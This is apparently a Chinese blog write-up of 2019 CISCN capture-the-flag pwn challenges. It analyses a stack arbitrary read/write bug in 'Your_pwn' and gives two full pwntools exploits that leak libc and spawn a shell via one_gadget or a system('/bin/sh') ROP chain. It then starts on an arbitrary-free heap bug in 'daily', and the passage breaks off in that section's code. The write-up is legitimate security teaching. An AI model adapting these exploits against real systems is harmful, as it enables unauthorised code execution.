{"title":"2019CISCN_PWN(一)","slug":"2019CISCN-PWN-一","date":"2019-04-28T02:31:02.000Z","updated":"2019-09-21T08:32:43.789Z","comments":true,"path":"api/articles/2019CISCN-PWN-一.json","photos":[],"link":"","excerpt":"2019CISCN_PWN题解0x00  Your_pwn防护1<br>2<br>3<br>4<br>5<br>6<br>7<br>liwc@ubuntu:~/pwn/2019_guosai/your_pwn$ checksec pwn<br>[*] &apos;/home/liwc/pwn/2019_guosai/your_pwn/pwn&apos;<br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br>RELRO没全开，其余全开分析首先会向栈上写0x100，然后循环调用sub_B35函数。函数要求输入一个index，然后leak出从rbp - 0x150起的v4[index]的值，然后将值覆盖为要修改的值，也就是实现栈上的任意读写。1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>_BOOL8 sub_B35()<br>&#123;<br>  int index; // [rsp+4h] [rbp-15Ch]<br>  int v2; // [rsp+8h] [rbp-158h]<br>  int i; // [rsp+Ch] [rbp-154h]<br>  char v4[64]; // [rsp+10h] [rbp-150h]<br>  char s; // [rsp+50h] [rbp-110h]<br>  unsigned __int64 v6; // [rsp+158h] [rbp-8h]<br><br>  v6 = __readfsqword(0x28u);<br>  memset(&amp;s, 0, 0x100uLL);<br>  memset(v4, 0, 0x28uLL);<br>  for ( i = 0; i &lt;= 40; ++i )<br>  &#123;<br>    puts(\"input index\");<br>    __isoc99_scanf(\"%d\", &amp;index);<br>    printf(\"now value(hex) %x\\n\", (unsigned int)v4[index]);<br>    puts(\"input new value\");<br>    __isoc99_scanf(\"%d\", &amp;v2);<br>    v4[index] = v2;<br>  &#125;<br>  puts(\"do you want continue(yes/no)? \");<br>  read(0, &amp;s, 0x100uLL);<br>  return strncmp(&amp;s, \"yes\", 3uLL) == 0;<br>&#125;<br>利用先leak出libc地址libc在rsp+0x280处，一开始输入的name在rsp + 0x170处，1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>gef➤  dereference $rsp<br>0x00007fffffffdc90│+0x0140: 0x0000000000000000<br>0x00007fffffffdc98│+0x0148: 0x0000000000000000<br>0x00007fffffffdca0│+0x0150: 0x0000000000000000<br>0x00007fffffffdca8│+0x0158: 0x82e23df75b4cba00<br>0x00007fffffffdcb0│+0x0160: 0x00007fffffffddd0  →  0x0000555555554ca0  →   push r15\t ← $rbp<br>0x00007fffffffdcb8│+0x0168: 0x0000555555554b11  →   test eax, eax<br>0x00007fffffffdcc0│+0x0170: 0x0000000a6377696c (&quot;liwc&quot;?)<br><br><br>gef➤  dereference $rsp<br>0x00007fffffffddd0│+0x0280: 0x0000555555554ca0  →   push r15<br>0x00007fffffffddd8│+0x0288: 0x00007ffff7a2d830  →  &lt;__libc_start_main+240&gt; mov edi, eax<br>可以看到，在libc地址为0x7f766337c830时，leak出的值为ffffffc8，所以只需要删除ffffff即可。1<br>2<br>0x00007fffbaeeb878│+0x0288: 0x00007f765337c830  →  &lt;__libc_start_main+240&gt; mov edi, eax<br>[&apos;30&apos;, &apos;ffffffc8&apos;, &apos;37&apos;, &apos;53&apos;, &apos;76&apos;, &apos;7f&apos;, &apos;0&apos;, &apos;0&apos;]<br>最后直接把retn地址覆盖为one_gadget即可，直接绕过了canary，exp如下<br>","covers":null,"content":"<h1 id=\"2019CISCN-PWN题解\"><a href=\"#2019CISCN-PWN题解\" class=\"headerlink\" title=\"2019CISCN_PWN题解\"></a>2019CISCN_PWN题解</h1><h2 id=\"0x00-Your-pwn\"><a href=\"#0x00-Your-pwn\" class=\"headerlink\" title=\"0x00  Your_pwn\"></a>0x00  Your_pwn</h2><h3 id=\"防护\"><a href=\"#防护\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/2019_guosai/your_pwn$ checksec pwn</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/2019_guosai/your_pwn/pwn&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n<p>RELRO没全开，其余全开</p>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>首先会向栈上写0x100，然后循环调用sub_B35函数。函数要求输入一个index，然后leak出从rbp - 0x150起的v4[index]的值，然后将值覆盖为要修改的值，也就是实现栈上的任意读写。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_<span class=\"function\">BOOL8 <span class=\"title\">sub_B35</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> index; <span class=\"comment\">// [rsp+4h] [rbp-15Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v2; <span class=\"comment\">// [rsp+8h] [rbp-158h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> i; <span class=\"comment\">// [rsp+Ch] [rbp-154h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v4[<span class=\"number\">64</span>]; <span class=\"comment\">// [rsp+10h] [rbp-150h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> s; <span class=\"comment\">// [rsp+50h] [rbp-110h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v6; <span class=\"comment\">// [rsp+158h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v6 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(&amp;s, <span class=\"number\">0</span>, <span class=\"number\">0x100</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(v4, <span class=\"number\">0</span>, <span class=\"number\">0x28</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">40</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"input index\"</span>);</span><br><span class=\"line\">    __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;index);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"now value(hex) %x\\n\"</span>, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)v4[index]);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"input new value\"</span>);</span><br><span class=\"line\">    __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v2);</span><br><span class=\"line\">    v4[index] = v2;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"do you want continue(yes/no)? \"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;s, <span class=\"number\">0x100</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">strncmp</span>(&amp;s, <span class=\"string\">\"yes\"</span>, <span class=\"number\">3u</span>LL) == <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>先leak出libc地址</p>\n<p>libc在rsp+0x280处，一开始输入的name在rsp + 0x170处，</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  dereference $rsp</span><br><span class=\"line\">0x00007fffffffdc90│+0x0140: 0x0000000000000000</span><br><span class=\"line\">0x00007fffffffdc98│+0x0148: 0x0000000000000000</span><br><span class=\"line\">0x00007fffffffdca0│+0x0150: 0x0000000000000000</span><br><span class=\"line\">0x00007fffffffdca8│+0x0158: 0x82e23df75b4cba00</span><br><span class=\"line\">0x00007fffffffdcb0│+0x0160: 0x00007fffffffddd0  →  0x0000555555554ca0  →   push r15\t ← $rbp</span><br><span class=\"line\">0x00007fffffffdcb8│+0x0168: 0x0000555555554b11  →   test eax, eax</span><br><span class=\"line\">0x00007fffffffdcc0│+0x0170: 0x0000000a6377696c (&quot;liwc&quot;?)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">gef➤  dereference $rsp</span><br><span class=\"line\">0x00007fffffffddd0│+0x0280: 0x0000555555554ca0  →   push r15</span><br><span class=\"line\">0x00007fffffffddd8│+0x0288: 0x00007ffff7a2d830  →  &lt;__libc_start_main+240&gt; mov edi, eax</span><br></pre></td></tr></table></figure>\n<p>可以看到，在libc地址为0x7f766337c830时，leak出的值为ffffffc8，所以只需要删除ffffff即可。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x00007fffbaeeb878│+0x0288: 0x00007f765337c830  →  &lt;__libc_start_main+240&gt; mov edi, eax</span><br><span class=\"line\">[&apos;30&apos;, &apos;ffffffc8&apos;, &apos;37&apos;, &apos;53&apos;, &apos;76&apos;, &apos;7f&apos;, &apos;0&apos;, &apos;0&apos;]</span><br></pre></td></tr></table></figure>\n<p>最后直接把retn地址覆盖为one_gadget即可，直接绕过了canary，exp如下<br><a id=\"more\"></a><br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">\"./pwn\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"name:\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"liwc\"</span>)</span><br><span class=\"line\">nums = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"index\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(<span class=\"number\">0x288</span> - <span class=\"number\">0x10</span> + i))</span><br><span class=\"line\">\tnum = p.recvline().split(<span class=\"string\">' '</span>)[<span class=\"number\">-1</span>].strip()</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"input new value\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(int(<span class=\"string\">\"0x\"</span> + num, <span class=\"number\">16</span>)))</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> num.startswith(<span class=\"string\">\"ffffff\"</span>):</span><br><span class=\"line\">\t\tnum = num[<span class=\"number\">-2</span>:]</span><br><span class=\"line\">\tnums.append(num)</span><br><span class=\"line\"></span><br><span class=\"line\">tmp = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> ch <span class=\"keyword\">in</span> [chr(int(<span class=\"string\">\"0x\"</span> + i, <span class=\"number\">16</span>)) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> nums]:</span><br><span class=\"line\">\ttmp += ch</span><br><span class=\"line\">libc_addr = u64(tmp)</span><br><span class=\"line\">libc_base = libc_addr - <span class=\"number\">0x20830</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(libc_addr)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></span><br><span class=\"line\">one_gadget = <span class=\"number\">0x45216</span> <span class=\"comment\"># 0x4526a 0xf02a4 0xf1147</span></span><br><span class=\"line\">one_gadget += libc_base</span><br><span class=\"line\">one_gadget = p64(one_gadget)</span><br><span class=\"line\">rip = (<span class=\"number\">0x150</span> + <span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"index\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(rip + i))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"input new value\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(ord(one_gadget[i])))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">41</span> - <span class=\"number\">16</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"index\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(<span class=\"number\">10</span>))</span><br><span class=\"line\">\tnum = p.recvline().split(<span class=\"string\">' '</span>)[<span class=\"number\">-1</span>].strip()</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"input new value\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(int(<span class=\"string\">\"0x\"</span> + num, <span class=\"number\">16</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"? \\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"no\"</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>不过，似乎原题未提供libc，那么我们用one_gadget可能会不太方便（其实也行）。那么就还要leak出程序本身的加载地址，然后将rip劫持为pop rdi，再在栈上布置/bin/sh\\x00的地址，最后再布置system@libc，然后就能getshell。照这种思路，正好会用40次读写，说明这个题目限制的还是比较死的。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">\"./pwn\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"name:\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"/bin/sh\\x00\"</span>)</span><br><span class=\"line\">nums = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak libc</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"index\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(<span class=\"number\">0x288</span> - <span class=\"number\">0x10</span> + i))</span><br><span class=\"line\">\tnum = p.recvline().split(<span class=\"string\">' '</span>)[<span class=\"number\">-1</span>].strip()</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"input new value\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(int(<span class=\"string\">\"0x\"</span> + num, <span class=\"number\">16</span>)))</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> num.startswith(<span class=\"string\">\"ffffff\"</span>):</span><br><span class=\"line\">\t\tnum = num[<span class=\"number\">-2</span>:]</span><br><span class=\"line\">\tnums.append(num)</span><br><span class=\"line\"></span><br><span class=\"line\">tmp = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> ch <span class=\"keyword\">in</span> [chr(int(<span class=\"string\">\"0x\"</span> + i, <span class=\"number\">16</span>)) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> nums]:</span><br><span class=\"line\">\ttmp += ch</span><br><span class=\"line\">libc_addr = u64(tmp)</span><br><span class=\"line\">libc_base = libc_addr - <span class=\"number\">0x20830</span></span><br><span class=\"line\">binsh = libc_base + next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\">system = libc_base + libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(libc_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">nums = []\t</span><br><span class=\"line\"><span class=\"comment\"># leak elf</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"index\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(<span class=\"number\">0x280</span> - <span class=\"number\">0x10</span> + i))</span><br><span class=\"line\">\tnum = p.recvline().split(<span class=\"string\">' '</span>)[<span class=\"number\">-1</span>].strip()</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"input new value\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(int(<span class=\"string\">\"0x\"</span> + num, <span class=\"number\">16</span>)))</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> num.startswith(<span class=\"string\">\"ffffff\"</span>):</span><br><span class=\"line\">\t\tnum = num[<span class=\"number\">-2</span>:]</span><br><span class=\"line\">\tnums.append(num)</span><br><span class=\"line\"></span><br><span class=\"line\">tmp = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> ch <span class=\"keyword\">in</span> [chr(int(<span class=\"string\">\"0x\"</span> + i, <span class=\"number\">16</span>)) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> nums]:</span><br><span class=\"line\">\ttmp += ch</span><br><span class=\"line\">elf_addr = u64(tmp)</span><br><span class=\"line\">elf_base = elf_addr - <span class=\"number\">0xca0</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(elf_base)</span><br><span class=\"line\"></span><br><span class=\"line\">poprdi = <span class=\"number\">0x0000000000000d03</span> <span class=\"comment\">#: pop rdi ; ret</span></span><br><span class=\"line\">poprdi += elf_base</span><br><span class=\"line\"></span><br><span class=\"line\">rip = <span class=\"number\">0x150</span> + <span class=\"number\">8</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># hijack retn addr</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"index\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(rip + i))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"input new value\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(ord(p64(poprdi)[i])))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># put /bin/sh addr on stack</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"index\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(rip + <span class=\"number\">8</span> + i))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"input new value\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(ord(p64(binsh)[i])))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># call system</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"index\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(rip + <span class=\"number\">16</span> + i))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"input new value\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(ord(p64(system)[i])))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">41</span> - <span class=\"number\">40</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"index\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(<span class=\"number\">10</span>))</span><br><span class=\"line\">\tnum = p.recvline().split(<span class=\"string\">' '</span>)[<span class=\"number\">-1</span>].strip()</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"input new value\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(int(<span class=\"string\">\"0x\"</span> + num, <span class=\"number\">16</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"? \\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"no\"</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x01-daily\"><a href=\"#0x01-daily\" class=\"headerlink\" title=\"0x01 daily\"></a>0x01 daily</h2><h3 id=\"防护-1\"><a href=\"#防护-1\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/2019_guosai/daily$ checksec daily</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/2019_guosai/daily/daily&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<p>没有开启PIE，但其余全开，RELRO开启。</p>\n<h3 id=\"分析-1\"><a href=\"#分析-1\" class=\"headerlink\" title=\"分析\"></a>分析</h3><h4 id=\"add\"><a href=\"#add\" class=\"headerlink\" title=\"add\"></a>add</h4><p>会根据输入的size malloc一个chunk，将chunk总数量num存储在bss段上，并且每次将chunk的size和指针都存在bss端上。</p>\n<h4 id=\"delete\"><a href=\"#delete\" class=\"headerlink\" title=\"delete\"></a>delete</h4><p>如果bss段相应的指针不为null，则free掉，并置为null，同时将size清零，num自减1。但是这里index存在漏洞。free的指针是用index * 16 + 0x602068计算得到的，所以如果在堆上伪造fake chunk和指向fake chunk的指针，就可以实现任意地址free，也就可以实现double free（或者unlink）。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000000000400C24                 mov     eax, [rbp+index]</span><br><span class=\"line\">.text:0000000000400C27                 cdqe</span><br><span class=\"line\">.text:0000000000400C29                 shl     rax, 4</span><br><span class=\"line\">.text:0000000000400C2D                 add     rax, 602068h</span><br><span class=\"line\">.text:0000000000400C33                 mov     rax, [rax]</span><br><span class=\"line\">.text:0000000000400C36                 mov     rdi, rax        ; ptr</span><br><span class=\"line\">.text:0000000000400C39                 call    free</span><br></pre></td></tr></table></figure>\n<h4 id=\"upgrade\"><a href=\"#upgrade\" class=\"headerlink\" title=\"upgrade\"></a>upgrade</h4><p>根据存储的size向bss段中写。</p>\n<h3 id=\"利用-1\"><a href=\"#利用-1\" class=\"headerlink\" title=\"利用\"></a>利用</h3><h4 id=\"leak-libc\"><a href=\"#leak-libc\" class=\"headerlink\" title=\"leak libc\"></a>leak libc</h4><p>首先通过正常方法leak出libc：即放入unsorted bin后，再申请出来。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span 